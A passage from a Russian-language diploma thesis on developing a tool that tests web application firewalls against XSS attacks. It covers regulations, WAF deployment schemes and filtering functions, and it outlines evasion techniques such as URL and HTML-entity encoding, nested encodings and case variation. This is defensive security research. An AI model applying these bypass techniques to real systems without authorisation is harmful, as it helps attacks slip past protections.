ЛИСТ ЗАДАНИЯ КАЛЕНДАРНЫЙ ПЛАН РЕФЕРАТ Дипломный проект содержит … Ключевые слова: МЕЖСЕТЕВОЙ ЭКРАН ВЕБ-ПРИЛОЖЕНИЙ, XSS-АТАКИ, УСТОЙЧИВОСТЬ К АТАКАМ, ТЕХНИКИ ОБХОДА ЗАЩИТЫ, АВТОМАТИЗИРОВАННОЕ ТЕСТИРОВАНИЕ . Объектом исследования  являются системы защиты веб-приложений — межсетевые экраны веб-приложений (WAF) . Предметом исследования являются методы оценки устойчивости WAF к XSS-атакам. Цель дипломного проекта – разработка приложения для тестирования  WAF   на устойчивость к атакам типа  XSS . В работе проанализированы современные типы XSS-атак и методы их обнаружения. Разработан программный инструмент, включающий модуль генерации XSS-пейлоадов, систему отправки запросов и анализа ответов WAF. Проведенные испытания подтвердили эффективность предложенного решения для выявления слабых мест в настройках систем защиты. Практическое применение инструмента позволяет повысить безопасность веб-приложений за счет своевременного обнаружения уязвимостей, что способствует улучшению защиты от атак и предотвращению утечек данных.   СОДЕРЖАНИЕ  TOC \h \z \t "Заголовок 1;2;Заголовок 2;3;Заголовок 3;4;Заголовок 4;5;Заголовок;1"  ЛИСТ ЗАДАНИЯ  PAGEREF _Toc216935089 \h  1 КАЛЕНДАРНЫЙ ПЛАН  PAGEREF _Toc216935090 \h  2 РЕФЕРАТ  PAGEREF _Toc216935091 \h  3 СОДЕРЖАНИЕ  PAGEREF _Toc216935092 \h  4 ОПРЕДЕЛЕНИЯ, ОБОЗНАЧЕНИЯ И СОКРАЩЕНИЯ  PAGEREF _Toc216935093 \h  7 ВВЕДЕНИЕ  PAGEREF _Toc216935094 \h  8 1 ИССЛЕДОВАТЕЛЬСКАЯ ЧАСТЬ  PAGEREF _Toc216935095 \h  11 1.1 Нормативна база и требования к защите веб-приложений и межсетевых экранов  PAGEREF _Toc216935096 \h  11 1.1.1 Федеральное законодательство в области защиты информации и персональных данных  PAGEREF _Toc216935097 \h  11 1.1.2 Требования ФСТЭК России к защите информационных систем и использованию межсетевых экранов  PAGEREF _Toc216935098 \h  12 1.1.3 Отраслевые стандарты и практики  PAGEREF _Toc216935099 \h  13 1.1.4 Обобщённые требования к защите веб-приложений и WAF для целей дипломного проекта  PAGEREF _Toc216935100 \h  14 1.2 Анализ межсетевых экранов веб-приложений (WAF): архитектура, функции и ограничения  PAGEREF _Toc216935101 \h  14 1.2.1 Место WAF в архитектуре веб-приложений и варианты развёртывания  PAGEREF _Toc216935102 \h  14 1.2.1.1 Reverse Proxy  PAGEREF _Toc216935103 \h  15 1.2.1.2 Inline-модуль в веб-сервере  PAGEREF _Toc216935104 \h  17 1.2.1.3 Облачный WAF  PAGEREF _Toc216935105 \h  19 1.2.2 Функции межсетевого экрана  PAGEREF _Toc216935106 \h  22 1.2.2.1 Анализ и нормализация HTTP-запросов  PAGEREF _Toc216935107 \h  22 1.2.2.2 Функция фильтрации HTTP-заголовков  PAGEREF _Toc216935108 \h  24 1.2.2.3 Функция обработки и фильтрации cookies  PAGEREF _Toc216935109 \h  25 1.2.2.4 Логирование и формирование событий безопасности  PAGEREF _Toc216935110 \h  26 1.2.3 Основные модели фильтрации трафика в  WAF  PAGEREF _Toc216935111 \h  28 1.2.3.1 Сигнатурная фильтрация  PAGEREF _Toc216935112 \h  28 1.2.3.2 Позитивная модель безопасности  PAGEREF _Toc216935113 \h  29 1.2.3.3 Поведенческая фильтрация  PAGEREF _Toc216935114 \h  29 1.2.3.4 Эвристическая фильтрация  PAGEREF _Toc216935115 \h  30 1.3 XSS-атаки как ключевая угроза для веб-приложений и WAF  PAGEREF _Toc216935116 \h  31 1.3.1 Классификация  XSS- атак  PAGEREF _Toc216935117 \h  32 1.3.1.1 Отраженная  XSS (Reflected XSS)  PAGEREF _Toc216935118 \h  33 1.3.2 Хранимая XSS (Stored XSS)  PAGEREF _Toc216935119 \h  34 1.3.3 DOM-ориентированная XSS (DOM-based XSS)  PAGEREF _Toc216935120 \h  35 1.4 Анализ методов тестирования защиты от XSS-атак  PAGEREF _Toc216935121 \h  37 1.4.1 Ручное тестирование  PAGEREF _Toc216935122 \h  37 1.4.2 Автоматизированные методы тестирования  PAGEREF _Toc216935123 \h  39 1.4.2.1 OWASP ZAP (Zed Attack Proxy)  PAGEREF _Toc216935124 \h  41 1.4.2.2 Burp-Suite  PAGEREF _Toc216935125 \h  41 1.4.2.3 XSSer  PAGEREF _Toc216935126 \h  42 1.4.3 Недостатки существующих решений  PAGEREF _Toc216935127 \h  43 2 Техни ч еское задание  PAGEREF _Toc216935128 \h  46 2.1 Введение  PAGEREF _Toc216935129 \h  46 2.2 Основания для разработки  PAGEREF _Toc216935130 \h  46 2.3 Назначение разработки  PAGEREF _Toc216935131 \h  46 2.4 Требования к программе или программному изделию  PAGEREF _Toc216935132 \h  47 2.4.1 Требования к функциональным характеристикам  PAGEREF _Toc216935133 \h  47 2.4.2 Требования к надёжности  PAGEREF _Toc216935134 \h  47 2.4.3 Условия эксплуатации  PAGEREF _Toc216935135 \h  48 2.4.4 Требования к составу и параметрам технических средств  PAGEREF _Toc216935136 \h  48 2.4.5 Требования к информационной и программной совместимости  PAGEREF _Toc216935137 \h  49 2.4.6 Требования к маркировке и упаковке  PAGEREF _Toc216935138 \h  49 2.4.7 Требования к транспортировке и хранению  PAGEREF _Toc216935139 \h  49 2.4.8 Специальные требования  PAGEREF _Toc216935140 \h  49 2.5 Требования к программной документации  PAGEREF _Toc216935141 \h  49 2.6 Технико-экономические показатели  PAGEREF _Toc216935142 \h  50 2.7 Стадии и этапы разработки  PAGEREF _Toc216935143 \h  50 2.8 Порядок контроля и приемки  PAGEREF _Toc216935144 \h  51 2.8.1 Виды испытаний  PAGEREF _Toc216935145 \h  51 2.8.2 Общие требования к приемке работы  PAGEREF _Toc216935146 \h  52 3 ЭЛЕМЕНТЫ ТЕХНИЧЕСКОГО ПРОЕКТА  PAGEREF _Toc216935147 \h  52 4 ЭКОНОМИЧЕСКОЕ ОБОСНОВАНИЕ  PAGEREF _Toc216935148 \h  53 4.1 Расчет экономической эффективности разработки инструментария для тестирования межсетевого экрана WAF  PAGEREF _Toc216935149 \h  53 5 БЕЗОПАСНОСТЬ ЖИЗНЕДЕЯТЕЛЬНОСТИ  PAGEREF _Toc216935150 \h  57 5.1 Охрана труда при работе с персональным компьютером  PAGEREF _Toc216935151 \h  57 5.2 Меры по снижению рисков  PAGEREF _Toc216935152 \h  59 5.3 Охрана труда при работе с персональным компьютером  PAGEREF _Toc216935153 \h  60 5.4 Защита от электромагнитных полей  PAGEREF _Toc216935154 \h  61 5.5 Ответственность за нарушение трудового законодательства  PAGEREF _Toc216935155 \h  61 ЗАКЛЮЧЕНИЕ  PAGEREF _Toc216935156 \h  62 СПИСОК ИСПОЛЬЗОВАННЫХ ИСТОЧНИКОВ  PAGEREF _Toc216935157 \h  65 ОПРЕДЕЛЕНИЯ, ОБОЗНАЧЕНИЯ И СОКРАЩЕНИЯ ВВЕДЕНИЕ В современном мире  веб-приложения и распределенные информационные системы стали неотъемлемой частью государственного управления, бизнеса и критически важных объектов. Рост объемов данных, расширение функционала онлайн-сервисов и усложнение их архитектуры неизбежно приводят к увеличению поверхности атаки. Одной из наиболее частых и опасных угроз является межсайтовый скриптинг  ( XSS ) .  Эта уязвимость позволяет злоумышленникам внедрять и запускать вредоносный  JavaScript - код на   доверенных ресурсах, что дает им доступ к личной информации пользователей, позволяет им совершать несанкционированные действия и   обходить системы безопасности. Согласно отчету об атаках на веб-приложения российских компаний с   января по июнь 2025 года, около 25% выявленных атак оказались межсайтовым скриптингом ,  большая часть из которых был и  направлен ы  на  электронную коммерцию  [1] .   Для защиты  различных онлайн -ресурсов широко применяются  межсетевые экраны веб-приложений ( WAF ). Их основная функция – сканировать и анализировать входящий трафик, выявляя вредоносные запросы, в том числе попытки использовать  XSS - уязвимости. Результативность  WAF   напрямую зависит от его настройки. Конфигурация межсетевого экрана должна содержать в себе корректные правила фильтрации, актуальные сигнатуры и точные эвристические алгоритмы. Также  WAF   должен иметь способность адаптироваться к новым способам обхода защиты.  В связи с развитием автоматизированных атак, усложнением систем маскировки вредоносных запросов и внедрения генеративных моделей, способных создавать уникальные эвристические вариации  XSS - пейлоад ов , становится необходимым разработ ать  инструмент ы , которые обеспечат  автоматическое  выявление уязвимых мест конфигурации  WAF  и проверку надежности фильтров против разнообразных атакующих техник. На основании вышеизложенного цель дипломного проекта формируется как: « Разработка программного обеспечения выявления уязвимостей межсетевых экранов при реализации XSS-атак ». Разрабатываемое программное обеспечение ориентированно на  специалистов по информационной безопасности, администраторов и разработчиков защитных решений и владельцев веб-ресурсов, поскольку проектируется с учетом необходимости проведения автоматического тестирования межсетевых экранов в процессе анализа веб-приложений.  Использование модулей машинного обучения при генерации и отправке  XSS пейлоадов делает систему полнофункциональным самостоятельным комплексом для анализа корректности и устойчивости настроек  WAF . Для достижения сформулированной цели поставлены и решены следующие задачи: Провести анализ современных видов XSS-атак и методов их детектирования, используемых в WAF. Исследовать существующие техники обхода WAF, применяемые для XSS-атак. Проанализировать аналогичные инструменты для тестирования WAF и выявить их сильные и слабые стороны. Разработать архитектуру инструмента, включающую модуль генерации XSS-пейлоадов, модуль отправки HTTP-запросов и анализа ответов WAF. Реализовать прототип инструмента на языке программирования Python, интегрировав в него базу данных модифицированных XSS-пейлоадов, направленных на обход стандартных сигнатур. Провести экспериментальное тестирование разработанного инструмента на примере одного или нескольких открытых WAF и оценить его эффективность по сравнению с существующими аналогами. Определить экономический эффект от внедрения разработанного инструмента, оценив сокращение затрат на коммерческие решения и повышение качества обучения. Рассмотреть вопросы обеспечения безопасности жизнедеятельности при работе за персональным компьютером и проанализировать нормативно-правовые акты в области охраны труда. ИССЛЕДОВАТЕЛЬСКАЯ ЧАСТЬ Разработка  программного обеспечения  для выявления уязвимостей межсетевых экранов требует  глубокого понимания   природы  XSS - атак   и принципов работы  WAF . В этом разделе  анализируются  основные механизмы защиты веб-приложений , проводится обзор существующих решений в области тестирования  WAF , их преимущества и ограничения.   Нормативна база и требования к защите веб-приложений и межсетевых экранов Разработка программного обеспечения для анализа защищенности межсетевых экранов веб-приложений основывается на нормативно-правовой базе, которая регулирует защиту информации и использование WAF. Важно учитывать как федеральные законы, так и отраслевые стандарты и практики . Федеральное законодательство в области защиты информации и персональных данных Основные принципы защиты информации, обрабатываемой веб-приложениями, заданы рядом федеральных законов: Федеральный закон № 149-ФЗ «Об информации, информационных технологиях и о защите информации»  регулирует защиту информации от несанкционированного доступа и модификации в информационных системах   [3] . Федеральный закон № 152-ФЗ «О персональных данных»  устанавливает требования к защите персональных данных, включая необходимость их защиты в веб-приложениях   [4] . Федеральный закон № 187-ФЗ «О безопасности критической информационной инфраструктуры Российской Федерации»  требует защиты значимых объектов инфраструктуры, включая веб-ресурсы органов власти и финансовых организаций . Закон устанавливает  требования по обеспечению устойчивости таких систем к компьютерным атакам, что напрямую затрагивает средства сетевой защиты и межсетевые экраны уровня приложений  [5] . Эти законы обязывают обеспечить защиту данных, а также использование средств защиты, таких как межсетевые экраны для фильтрации вредоносных запросов. Требования ФСТЭК России к защите информационных систем  и использованию межсетевых экранов Специализированные требования к защите государственных информационных систем, информационных систем персональных данных и значимых объектов КИИ устанавливаются нормативными правовыми актами ФСТЭК России. Для веб-приложений и WAF наиболее значимы: Приказ ФСТЭК России № 17 от 11.02.2013 «Об утверждении Требований о защите информации, не составляющей государственную тайну, содержащейся в государственных информационных системах»   регламентирует требования к защите информации в государственных информационных системах и каналах связи   [6] . Приказ ФСТЭК России № 21 от 18.02.2013 «Об утверждении состава и содержания организационных и технических мер по обеспечению безопасности персональных данных при их обработке в информационных системах персональных данных».  определяет меры по обеспечению безопасности персональных данных в информационных системах персональных данных   [7] . Приказ ФСТЭК России № 239 от 25.12.2017 «Об утверждении Требований по обеспечению безопасности значимых объектов критической информационной инфраструктуры Российской Федерации»   устанавливает мер ы  для значимых объектов КИИ, включая обязательность регулярного анализа защищённости, моделирования  угроз, применения сертифицированных средств защиты и контроля их эффективности   [8] . Также  в классификации ФСТЭК выделяются межсетевые экраны уровня приложений и уровня веб-сервера (тип «Г»), предназначенные для контроля и фильтрации HTTP/HTTPS-трафика к веб-серверам и от них. Такие решения должны обеспечивать анализ содержимого запросов на уровне приложений, блокирование атак, характерных для веб-среды (XSS, SQL-инъекции, обход аутентификации и др.), а также ведение журналов событий безопасности.   [9] Отраслевые стандарты и практики Помимо общего регулирования, для веб-приложений и их защитных механизмов значимы отраслевые стандарты и открытые рекомендации профессиональных сообществ. В финансовом секторе ключевую роль играет ГОСТ Р 57580 .1-2017  «Безопасность финансовых (банковских) операций. Защита информации финансовых организаций».  Он  определяет базовый состав организационных и технических мер  [10].  Также  большое значение имеет  ГОСТ Р 57580.2-2018  «Безопасность финансовых (банковских) операций. Защита информации финансовых организаций. Методика оценки соответствия» . Он   описывает методику оценки соответствия реализованных мер требованиям стандарта   [11] .   На международном уровне стандартом для обеспечения безопасности веб-приложений выступают документы проекта OWASP.  Например,  OWASP Application Security Verification Standard (ASVS) — многоуровневый стандарт, определяющий набор требований к безопасности веб-приложений и веб - сервисов на различных уровнях строгости. ASVS описывает требования к аутентификации, управлению сессиями, обработке входных данных, защите от XSS и других уязвимостей, а также к журналированию и мониторингу безопасности   [ 12 ] .  Также значимы документом является  OWASP Top 10 — перечень наиболее критичных рисков безопасности веб-приложений, регулярно обновляемый на основе статистики уязвимостей в реальных системах. Атаки  типа  XSS  традиционно входят в состав ключевых категорий ,  что подчёркивает их распространённость и необходимость построения комплексных механизмов защиты и мониторинга  [13] . Обобщённые требования к защите веб-приложений и WAF для целей дипломного проекта В рамках дипломного проекта разрабатывается система для тестирования настройки WAF и анализа его устойчивости к атакам, включая попытки обхода защиты. Основной задачей системы является выявление слабых мест в настройках межсетевого экрана и проверка его способности эффективно фильтровать вредоносный трафик, в частности, от XSS-атак. Разрабатываемая система должна обеспечивать: Тестирование конфигурации WAF на предмет его уязвимости к различным техникам обхода защиты. Оценку эффективности фильтрации трафика на основе различных типов атак. Соблюдение требований безопасности в рамках действующих нормативных актов и стандартов (например, ГОСТ, OWASP). Анализ межсетевых экранов веб-приложений (WAF): архитектура, функции и ограничения Место WAF в архитектуре веб-приложений и варианты развёртывания Межсетевой экран веб-приложений (WAF) является важным элементом системы защиты веб-приложений, предназначенным для мониторинга и фильтрации HTTP/HTTPS-трафика. В отличие от традиционных сетевых экранов, которые работают на уровне сетевого и транспортного протоколов, WAF функционирует на уровне прикладного слоя и анализирует содержание HTTP-запросов и ответов  [14] . Это позволяет ему эффективно  противодействовать атакам, таким как XSS, SQL-инъекции и другие угрозы, которые направлены именно на уязвимости веб-приложений. WAF может быть интегрирован в инфраструктуру веб-приложений различными способами. При этом выбор способа развёртывания зависит от множества факторов, включая архитектуру приложения, требования к производительности и безопасности, а также особенности конфигурации серверной инфраструктуры. Как правило, WAF размещается на критической точке периметра веб-системы, что позволяет ему контролировать весь входящий и исходящий трафик между пользователем и веб-приложением. Однако, в зависимости от потребностей организации и уровня защиты, могут быть выбраны различные схемы развёртывания. Эти схемы влияют на то, как WAF будет взаимодействовать с остальными компонентами системы и какие механизмы защиты будут применяться. Теперь рассмотрим несколько распространённых вариантов развёртывания WAF, которые могут быть использованы в зависимости от архитектуры и специфики веб-приложений. Reverse Proxy Одним из наиболее распространённых и эффективных вариантов развёртывания межсетевого экрана веб-приложений (WAF) является схема Reverse Proxy. В этой конфигурации WAF функционирует как обратный прокси-сервер, который принимает все входящие запросы от клиентов, анализирует их и, при необходимости, фильтрует или блокирует, прежде чем они достигнут целевого веб-приложения   [14] . Рисунок   SEQ Рисунок \* ARABIC  1   Архитектура развертывания  WAF  по схеме  Reverse Proxy Источник: Составлено автором Reverse Proxy представляет собой компонент, который сидит между пользователем и веб-сервером. Он перенаправляет трафик от клиента на целевое приложение, выполняя при этом фильтрацию и проверку каждого запроса. В случае обнаружения угроз или подозрительного поведения, прокси может заблокировать запрос или направить его на другие системы безопасности для дополнительного анализа. Этот вариант развития WAF имеет ряд ключевых преимуществ, особенно в контексте защиты от распространённых веб-атак, таких как XSS, SQL-инъекции и другие .  Например: Полный контроль входящего трафика:  в  данном случае WAF полностью контролирует весь трафик, который поступает от пользователей, что позволяет ему выполнять глубокую проверку всех HTTP-запросов. Эта схема обеспечивает высокий уровень защиты, так как весь трафик проходит через одну точку, и можно эффективно фильтровать запросы на основе заранее определённых правил и сигнатур. Единая точка применения политик безопасности:  в се политики безопасности, такие как фильтрация XSS-пейлоадов, защита от DDoS-атак и другие меры, могут быть централизованно настроены на WAF. Это упрощает управление безопасностью, так как все настройки находятся в одном месте. Интеграция с балансировкой нагрузки:  ч асто WAF, работающий как обратный прокси, может быть интегрирован с системой балансировки нагрузки (load balancer). Это означает, что прокси не только защищает приложение, но и распределяет трафик между несколькими серверами, что повышает доступность и производительность веб-системы. Поддержка SSL-терминации:  д ля HTTPS-запросов, WAF, как обратный прокси, может выполнять SSL-терминацию, то есть расшифровывать SSL-соединения, прежде чем передавать запросы на веб-сервер. Это  позволяет WAF проводить более глубокий анализ трафика, поскольку зашифрованные данные становятся доступны для анализа. Однако, данный способ также имеет и некоторые недостатки. Например: Ошибка политик может привести к массовым блокировкам :   п оскольку весь трафик проходит через одну точку (WAF), ошибки в настройке правил или слишком агрессивная фильтрация могут привести к нежелательным блокировкам легитимных пользователей. Например, если WAF настроен слишком строго, может возникнуть множество ложных срабатываний, что приведет к ухудшению пользовательского опыта. Зависимость от производительности прокси:  р абота WAF как обратного прокси может создавать нагрузку на систему, особенно если трафик интенсивный. В таких случаях необходимо обеспечивать достаточную вычислительную мощность, чтобы избежать снижения производительности приложения. Трудности с масштабированием:  п ри высоких объемах трафика важно правильно настроить инфраструктуру для масштабирования, чтобы избежать перегрузки прокси. Это может потребовать дополнительных ресурсов для распределения трафика и оптимизации обработки запросов. Inline-модуль в веб-сервере Ещё одной распространённой схемой развёртывания WAF является интеграция его непосредственно в веб-сервер. В этом случае WAF работает как встроенный модуль внутри сервера, например, как часть Nginx или Apache. Это позволяет ему анализировать и фильтровать трафик непосредственно в процессе обработки запросов веб-сервером, прежде чем запросы попадут в приложение.   В отличие от схемы с обратным прокси, где WAF стоит между клиентом и сервером, в данной конфигурации WAF находится  « внутри »  сервера, анализируя и фильтруя трафик, пока тот не будет передан приложению   [14] . Рисунок   SEQ Рисунок \* ARABIC  2   Архитектура развертывания  WAF  по схеме   Inline - модуль Источник : Составлено автором В связи с таким способом внедрения,  Inline-модуль  имеет ряд преимуществ: Меньше инфраструктурных компонентов:  п оскольку WAF интегрирован непосредственно в веб-сервер, исключаются дополнительные компоненты, такие как отдельный прокси-сервер. Это упрощает инфраструктуру и снижает затраты на её развертывание и обслуживание. Полный доступ к расшифрованному HTTP:  в  отличие от схемы с обратным прокси, где для расшифровки SSL-соединений требуется отдельный процесс (SSL-терминация), в случае с Inline-модулем весь трафик, включая HTTPS, доступен веб-серверу и WAF для анализа без необходимости перенаправления трафика на сторонний сервер. Простота настройки и управления:  э та схема позволяет легко настроить WAF и быстро интегрировать его в существующую веб-инфраструктуру. Все правила и конфигурации могут быть централизованно настроены в одном месте. Хорошая производительность при низких нагрузках:  д ля малых и средних по нагрузке приложений этот вариант развёртывания может быть экономически эффективным и не требовать дополнительных затрат на масштабирование. Но этот способ имеет свои недостатки, такие как: Влияние на стабильность веб-сервера:  п оскольку WAF работает непосредственно в веб-сервере, ошибки или проблемы в настройке модуля могут повлиять на работу всего веб-приложения. Например, проблемы с фильтрацией могут вызвать отказ в обслуживании или снизить доступность приложения. Сложность обновлений и изменения правил:  в страивание WAF непосредственно в веб-сервер делает процесс обновления и изменения настроек более сложным. Это может потребовать перезагрузки сервера или перезагрузки конфигураций, что может привести к временной недоступности веб-приложения. Производительность при высоких нагрузках:  в  случае с большим количеством запросов или высокими нагрузками на сервер, WAF, работающий как модуль, может начать замедлять работу веб-сервера. Важно настроить систему так, чтобы нагрузки на WAF и веб-сервер были сбалансированы и не приводили к деградации производительности. Облачный WAF Облачные WAF (также известные как SaaS-WAF или CDN-WAF) представляют собой решения, которые размещаются и управляются сторонними поставщиками в облаке. Эти WAF обеспечивают защиту веб-приложений, фильтруя входящий трафик через облачные инфраструктуры, которые обрабатывают запросы до того, как они достигнут сервера приложения. Часто такие WAF используются в сочетании с Content Delivery Network (CDN), что позволяет дополнительно улучшить производительность и защиту от DDoS-атак   [14] . Облачный WAF размещается на стороне провайдера и фильтрует трафик, проходящий через его сеть, перед тем как он достигнет веб-приложения. В отличие от других вариантов развёртывания, где WAF физически размещён в инфраструктуре компании, облачный WAF позволяет перенести нагрузку на  внешнего провайдера, который предоставляет масштабируемые и обновляемые решения для защиты от атак на веб-приложения. Рисунок   SEQ Рисунок \* ARABIC  3   Архитектура развертывания  WAF  по схеме  облачного  WAF Источник: Составлено автором Основными преимуществами облачных  WAF ,  от других вариантов, являются: Быстрое внедрение:  о дним из главных преимуществ облачных WAF является простота развертывания. Поскольку решение полностью управляется внешним провайдером, компании не нужно заботиться о настройке серверов или инфраструктуры. Все настройки и обновления выполняются автоматически, что значительно сокращает время, необходимое для внедрения. Автоматические обновления и масштабируемость:  о блачные WAF обеспечивают автоматическое обновление сигнатур и правил безопасности, что позволяет быстро адаптироваться к новым угрозам. Масштабируемость такого решения позволяет эффективно обрабатывать большие объёмы трафика и быстро расширять ресурсы защиты при увеличении нагрузки на веб-приложение. Интеграция с CDN:  м ногие облачные WAF также интегрируются с системами доставки контента (CDN), что позволяет не только защищать веб-приложения, но и улучшать их производительность. CDN-кэширование помогает ускорить доставку контента, а также снижает нагрузку на веб-серверы, перенаправляя трафик через облачные серверы. Поддержка анти-DDoS:  о блачные WAF обычно оснащены встроенной защитой от DDoS-атак, которая может эффективно фильтровать и блокировать массовые атаки, прежде чем они достигнут веб-приложения. Это обеспечивает дополнительный уровень защиты в условиях высоких рисков. Однако,  использование облачных  WAF  также имеет  недостатки, такие как: Ограниченная кастомизация:  х отя облачные WAF предоставляют множество настроек, они могут не поддерживать все уровни кастомизации, которые возможны в традиционных решения, таких как WAF, развернутые в корпоративной инфраструктуре. В случае сложных или специфических требований по фильтрации трафика, облачное решение может оказаться менее гибким. Регуляторные и организационные ограничения:  в  некоторых случаях использование облачного WAF может вызвать проблемы с соблюдением локальных нормативных требований по безопасности и хранению данных, так как трафик будет проходить через сторонние серверы и страны, где может действовать другая законодательная база. Это особенно важно для компаний, работающих в отраслях, требующих строгого контроля за данными, например, в здравоохранении или финансовых услугах. Зависимость от провайдера:  в недрение облачного WAF требует доверия к внешнему поставщику услуг. Если провайдер испытывает проблемы с инфраструктурой или нарушает условия обслуживания, это может повлиять на доступность и безопасность приложения. Важно тщательно выбирать провайдера и учитывать гарантии, которые он предоставляет. Трудности с глубокой настройкой:  н екоторые облачные WAF могут иметь ограниченные возможности для детальной настройки и анализа трафика. Для специфичных атак, таких как сложные XSS или обходы защиты, стандартная настройка может оказаться недостаточной, что  потребует дополнительной настройки или использования других инструментов для анализа. Ф ункции  межсетевого экрана Межсетевой экран веб-приложений реализует набор специализированных функций, направленных на выявление и блокирование атак. В отличие от классических сетевых экранов, WAF оперирует логикой HTTP-протокола и структурой веб-приложений, что определяет как его сильные стороны, так и архитектурные ограничения. Понимание внутренних функций WAF и применяемых моделей фильтрации необходимо для корректной интерпретации результатов тестирования и построения алгоритмов обхода защиты в рамках дипломного проекта. Анализ и нормализация HTTP-запросов Основной функцией WAF является приём и разбор HTTP/HTTPS-запросов, поступающих на веб-приложение. На этом этапе WAF выполняет нормализацию данных — процесс приведения запроса к каноническому виду перед применением правил безопасности. Этот процесс является критически важным для корректного функционирования системы защиты и предотвращения обходных техник атакующих, так как многие вредоносные запросы могут быть замаскированы с помощью различных методов кодирования или нестандартного представления данных. Нормализация данных обычно включает в себя несколько ключевых операций, которые помогают системе понять реальный смысл передаваемых данных, устраняя любые искажения, вызванные кодировками или изменениями, сделанными в ходе передачи: Декодирование URL-кодирования — один из наиболее часто используемых методов маскировки данных. URL-кодирование преобразует символы в строки, которые могут быть не сразу распознаны системой как потенциально опасные. Например, символы, такие как < и >, могут быть  представлены как %3C и %3E соответственно, что затрудняет их идентификацию как вредоносные элементы. На этапе нормализации WAF декодирует такие символы, чтобы предотвратить обход фильтрации. Обработка HTML-сущностей — HTML-сущности часто используются для обхода фильтров, которые пытаются блокировать стандартные теги, такие как <script>. Для правильного анализа и предотвращения XSS-атак WAF должен преобразовать эти сущности в их исходные символы. Удаление избыточных пробелов, управляющих и невидимых символов — часто атакующие добавляют невидимые символы, такие как пробелы или символы табуляции, в данные, чтобы сбить с толку систему безопасности. Эти символы не влияют на выполнение атаки в браузере, но могут помешать WAF корректно идентифицировать запрос. Поэтому нормализация включает удаление или игнорирование таких символов. Разворачивание вложенных и повторных кодировок — когда кодировка используется несколько раз (например, URL-кодирование внутри другого URL-кодирования), это затрудняет анализ данных. WAF должен быть способен распознавать такие вложенные кодировки и корректно их разворачивать, чтобы понять истинное содержимое запроса. Приведение регистра и унификация представления параметров — атаки часто используют различные регистры символов в параметрах, чтобы обойти сигнатуры фильтрации (например,  « eval »  может быть написано ,  как  « EvAl »  или  « eval() » ). На этапе нормализации WAF приводит все параметры к стандартному регистру, что позволяет эффективно распознавать такие паттерны. Этот этап нормализации крайне важен для защиты от атак, поскольку большинство техник обхода WAF основано именно на нестандартном представлении вредоносного кода. Атакующие могут пытаться замаскировать свои действия, используя различные способы кодирования и преобразования данных, что затрудняет их детектирование. Ошибки или неполнота  нормализации могут привести к тому, что реальный исполняемый код в браузере будет отличаться от того представления, которое анализировал  межсетевой экран . Например, сложные XSS-пейлоады, состоящие из нескольких уровней кодировок, могут быть пропущены, если нормализация не выполнена корректно. Таким образом, тщательная и полноценная нормализация данных играет ключевую роль в эффективности работы WAF и его способности защищать веб-приложения от атак. Функция фильтрации HTTP-заголовков Также, о дной из важных функций WAF является анализ и фильтрация HTTP-заголовков, которые могут содержать информацию о клиенте, сервере, типе содержимого и других аспектах запроса. Заголовки часто используются атакующими для маскировки вредоносных запросов или для внедрения различных эксплойтов. Например, в заголовках User-Agent, Referer или X-Forwarded-For могут скрываться попытки провести атаку через манипуляции с идентификацией клиента или через использование прокси-серверов. На этапе фильтрации HTTP-заголовков WAF выполняет следующие операции: Проверка заголовков на наличие подозрительных значений:  в еб-приложения часто уязвимы к атакам, использующим нестандартные или изменённые значения в заголовках. Например, злоумышленники могут попытаться передать вредоносные данные через заголовок User-Agent, пытаясь обойти фильтрацию. WAF анализирует такие заголовки и проверяет их на соответствие безопасным значениям. Анализ заголовков на наличие скрытых угроз:  з аголовки могут быть использованы для передачи команд или данных, которые могут быть интерпретированы как уязвимости. Например, заголовки могут использоваться для внедрения кода или атаки на сессии пользователя. WAF проверяет такие заголовки на наличие подозрительных символов или конструкций, которые могут быть частью атаки, таких как скрипты или команды. Обработка нестандартных заголовков и попыток обхода:  а такующие могут использовать нестандартные или редкие заголовки для обхода фильтрации. Например, они могут добавить дополнительные поля или изменить структуру стандартных заголовков. WAF выполняет проверку таких нестандартных заголовков, чтобы предотвратить возможность обхода фильтрации. Эта функция критична для защиты веб-приложений, так как правильно настроенная фильтрация HTTP-заголовков помогает блокировать атаки на ранних этапах, прежде чем они достигнут более глубоких слоев приложения. Ошибки в фильтрации или игнорирование подозрительных заголовков могут привести к успешному обходу защиты, что увеличивает риски уязвимости веб-приложения. Функция обработки и фильтрации cookies Ещё одной важной функцией WAF является анализ и фильтрация cookies (куки), которые являются неотъемлемой частью взаимодействия веб-приложений с пользователями. Cookies часто содержат данные о сессии, идентификаторы пользователей и другие важные параметры, которые могут быть использованы для атаки. Например, злоумышленник может попытаться подменить или извлечь чувствительную информацию из cookies, чтобы захватить сессию пользователя или провести атаку на сервер. На этапе фильтрации cookies  межсетевой экран  выполняет несколько важных операций: Проверка на наличие подмены данных:  Вредоносные пользователи могут попытаться подменить или манипулировать cookies для получения несанкционированного доступа к данным или сессиям. WAF анализирует cookies на наличие аномальных значений или подозрительных данных, таких как неправомерно изменённые или подозрительно выглядящие идентификаторы сессий или другие параметры. Анализ на предмет уязвимостей в cookies:  Злоумышленники могут использовать cookies для внедрения вредоносных данных, таких как скрипты или командные инъекции. Важно, чтобы WAF проверял cookies на наличие таких угроз, как XSS или SQL-инъекции, которые могут быть внедрены в cookies и использованы для атак на веб-приложение. Фильтрация cookies по конфиденциальности:  Некоторые cookies могут содержать персональные данные или другую конфиденциальную информацию, которая не должна передаваться или храниться в открытом виде. WAF проверяет cookies на соответствие стандартам безопасности, например, для предотвращения утечек данных пользователей или несоответствия требованиям законодательства о защите персональных данных (например, GDPR). Обработка нестандартных cookies:  Вредоносные запросы могут содержать нестандартные или вредоносные cookies, которые используются для обхода защиты. Например, атакующие могут добавить дополнительные cookies или использовать необычные параметры для манипуляции сессиями. WAF фильтрует и блокирует такие cookies для предотвращения потенциальных атак. Эта функция критична для защиты веб-приложений от атак на уровне сессий и персональных данных. Ошибки в фильтрации cookies могут привести к утечке чувствительных данных или захвату сессий, что может существенно нарушить безопасность веб-приложений и поставить под угрозу пользователей. Логирование и формирование событий безопасности Логирование является неотъемлемой частью работы WAF и играет важную роль в процессе мониторинга безопасности веб-приложений. Эта функция предназначена для записи всех событий, связанных с обработкой HTTP-запросов, обнаружением атак и действиями межсетевого экрана. Логирование помогает не только отслеживать эффективность работы системы защиты, но и предоставляет информацию, необходимую для анализа инцидентов, аудита и последующих корректировок конфигураций безопасности . На этапе логирования WAF выполняет следующие важные функции: Запись данных о запросах и ответах: WAF логирует всю информацию о поступающих запросах, включая заголовки, параметры URL, cookies и тело запроса. Также записываются коды ответов, полученные от веб-приложения. 